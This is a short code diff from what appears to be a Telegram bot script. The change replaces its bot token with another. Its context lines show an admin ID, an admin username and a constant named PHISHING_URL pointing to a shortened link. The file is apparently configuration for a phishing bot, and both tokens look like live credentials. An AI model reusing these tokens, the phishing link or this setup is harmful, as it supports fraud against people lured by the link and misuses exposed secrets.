@@ -3,7 +3,7 @@ import time
 import json
 from datetime import datetime, timedelta
 
-BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
+BOT_TOKEN = "8601549576:AAF-Onz6mTak_6V-bZ368IYJ0PWyZL9EF1Y"
 ADMIN_ID = 8744429026
 ADMIN_USERNAME = "NeresVoid"
 PHISHING_URL = "https://da.gd/tzO5QW"
